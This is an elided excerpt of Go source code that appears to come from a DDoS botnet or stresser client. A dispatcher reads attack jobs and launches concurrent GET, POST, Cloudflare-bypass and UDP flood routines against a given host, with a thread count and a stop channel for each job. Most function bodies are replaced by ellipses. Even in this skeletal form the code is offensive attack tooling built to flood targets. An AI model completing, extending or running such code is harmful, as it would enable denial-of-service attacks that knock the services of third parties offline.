	...
	for {
		...
		for {
			...
			for {
				...
				Role(Attacks, UpdateAttack, stopCh, check)
...
func Role(Attack, UpdateAttack AttackManager, stopCh map[string]chan struct{}, check map[string]bool) {
	for hash, value := range Attack.Managers {
		...
		if !HashManager[hash] {
			...
			switch value.Method {
			case "GET":
				go GET(value.Host, value.Thread, stopCh[hash])
			case "POST":
				go POST(value.Host, value.Thread, stopCh[hash])
			case "CF-GET":
			...
			case "UDP":
				go UDP(value.Host, value.Thread, stopCh[hash])
			}
		}
	}
...
func UDP(Host string, Thread int, stopCh chan struct{}) {
...
func GET(Host string, Thread int, stopCh chan struct{}) {
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
...
func POST(Host string, Thread int, stopCh chan struct{}) {
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
